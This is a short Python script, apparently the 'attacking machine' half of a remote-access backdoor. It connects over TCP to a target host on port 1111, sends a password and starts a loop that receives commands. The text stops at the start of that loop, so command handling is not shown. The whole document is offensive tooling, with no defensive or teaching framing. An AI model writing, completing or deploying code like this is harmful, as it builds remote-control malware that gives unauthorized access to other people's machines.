import socket
import os
import sys
# this is for the attacking machine

HOST = sys.argv[1] 
PORT = 1111

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
pwd = sys.argv[2]
s.send(pwd.encode())
while True:
    command = s.recv(4096).decode().split()
